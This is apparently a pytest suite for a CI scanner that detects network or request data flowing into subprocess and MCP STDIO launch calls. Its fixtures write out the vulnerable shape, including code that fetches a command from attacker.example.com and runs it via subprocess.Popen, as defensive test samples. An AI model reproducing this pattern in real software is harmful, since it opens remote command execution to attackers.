"""Tests for the v0.5.7 STDIO-taint static-analysis CI gate.

Loads ``tools/scan_stdio_remote_input_flow.py`` via ``importlib.util``
so we can test ``scan_repo`` directly against synthetic source files
without spawning a subprocess.

Primary sources (cited per v0.5.1+ convention):
- OX Security 2026-04-15 deep dive on STDIO command-execution flaws
- CVE-2026-6980 (RedPacket Security 2026-04-25) — same flow shape
- CVE-2026-30615 (NVD / Tenable) — same flow shape
"""

from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent.parent
SCRIPT = ROOT / "tools" / "scan_stdio_remote_input_flow.py"

_spec = importlib.util.spec_from_file_location("stdio_taint_scanner", SCRIPT)
assert _spec is not None
scanner = importlib.util.module_from_spec(_spec)
sys.modules["stdio_taint_scanner"] = scanner
assert _spec.loader is not None
_spec.loader.exec_module(scanner)


def _write(path: Path, code: str) -> None:
    path.write_text(code, encoding="utf-8")


class TestCleanCases:
    """Code that has no taint-flow path must yield zero findings."""

    def test_clean_subprocess_run(self, tmp_path: Path) -> None:
        f = tmp_path / "ok.py"
        _write(
            f,
            """
import subprocess

def launch():
    subprocess.run(["uvx", "mcp-foo"], shell=False)
""",
        )
        result = scanner.scan_repo([tmp_path])
        assert result.findings == []

    def test_locally_constructed_argv_baseline(self, tmp_path: Path) -> None:
        f = tmp_path / "local.py"
        _write(
            f,
            """
import subprocess

CMD = ["uvx", "mcp-foo"]

def boot():
    subprocess.Popen(CMD)
""",
        )
        result = scanner.scan_repo([tmp_path])
        assert result.findings == []


class TestTaintFlowsBlocked:
    """Taint flowing into a sink must be flagged."""

    def test_requests_text_into_popen(self, tmp_path: Path) -> None:
        f = tmp_path / "leak.py"
        _write(
            f,
            """
import subprocess
import requests

def evil():
    body = requests.get("https://attacker.example.com/cmd").text
    subprocess.Popen([body])
""",
        )
        result = scanner.scan_repo([tmp_path])
        assert len(result.unsuppressed) == 1
        finding = result.unsuppressed[0]
        assert finding.sink == "subprocess.Popen"
        # Either ``network_call`` (direct call) or ``network_attr``
        # (chained ``.text`` access) — both are valid taint shapes.
        assert "network" in finding.source_kind

    def test_fastapi_body_into_stdio_server_parameters(self, tmp_path: Path) -> None:
        f = tmp_path / "fastapi_leak.py"
        _write(
            f,
            """
from mcp.client.stdio import StdioServerParameters
from fastapi import FastAPI

app = FastAPI()

@app.post("/launch")
async def launch(req_command: str):
    StdioServerParameters(command=req_command)
""",
        )
        result = scanner.scan_repo([tmp_path])
        assert len(result.unsuppressed) == 1
        assert result.unsuppressed[0].sink == "StdioServerParameters"

    def test_multi_hop_taint(self, tmp_path: Path) -> None:
        f = tmp_path / "multihop.py"
        _write(
            f,
            """
import subprocess
import httpx

def boot():
    payload = httpx.get("https://x").json()
    cmd_data = payload
    argv = [cmd_data]
    subprocess.run(argv)
""",
        )
        result = scanner.scan_repo([tmp_path])
        assert len(result.unsuppressed) == 1
        assert result.unsuppressed[0].sink == "subprocess.run"


class TestPragmaSuppression:
    """``# noqa: AIRLOCK-TAINT-OK <reason>`` must suppress; empty pragmas must not."""

    def test_pragma_with_reason_suppresses(self, tmp_path: Path) -> None:
        f = tmp_path / "pragma_ok.py"
        _write(
            f,
            """
import subprocess
import requests

def known_safe():
    body = requests.get("https://internal.svc/registered-server").text
    subprocess.Popen([body])  # noqa: AIRLOCK-TAINT-OK signed-internal-only
""",
        )
        result = scanner.scan_repo([tmp_path])
        # Finding present but suppressed — audit-trail row remains
        assert len(result.findings) == 1
        assert result.findings[0].suppressed_by_pragma is True
        assert "signed-internal-only" in result.findings[0].pragma_reason
        assert result.unsuppressed == []

    def test_pragma_without_reason_does_not_suppress(self, tmp_path: Path) -> None:
        f = tmp_path / "pragma_empty.py"
        _write(
            f,
            """
import subprocess
import requests

def evil():
    body = requests.get("https://x").text
    subprocess.Popen([body])  # noqa: AIRLOCK-TAINT-OK
""",
        )
        result = scanner.scan_repo([tmp_path])
        assert len(result.unsuppressed) == 1


class TestRepoIsClean:
    """The agent-airlock repo itself must scan clean — proves the gate
    isn't immediately broken by our own code."""

    def test_agent_airlock_repo_is_clean(self) -> None:
        result = scanner.scan_repo([ROOT / "src", ROOT / "tests", ROOT / "examples"])
        assert result.unsuppressed == [], (
            f"agent-airlock has unsuppressed taint findings: {result.unsuppressed}"
        )


class TestCLI:
    """``main()`` exit codes + JSON summary on findings."""

    def test_main_exits_0_on_clean(self, tmp_path: Path, capsys: pytest.CaptureFixture) -> None:
        f = tmp_path / "ok.py"
        _write(f, "import subprocess\nsubprocess.run(['x'])\n")
        rc = scanner.main([str(tmp_path)])
        assert rc == 0
        out = capsys.readouterr().out
        assert "clean" in out

    def test_main_exits_1_and_writes_summary(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        leak = tmp_path / "leak.py"
        _write(
            leak,
            """
import subprocess
import requests

def evil():
    body = requests.get("https://x").text
    subprocess.Popen([body])
""",
        )
        monkeypatch.chdir(tmp_path)
        rc = scanner.main([str(tmp_path)])
        assert rc == 1
        summary = tmp_path / ".airlock-stdio-taint.json"
        assert summary.exists()
        data = json.loads(summary.read_text())
        assert data["unsuppressed_count"] == 1
        assert data["findings"][0]["sink"] == "subprocess.Popen"
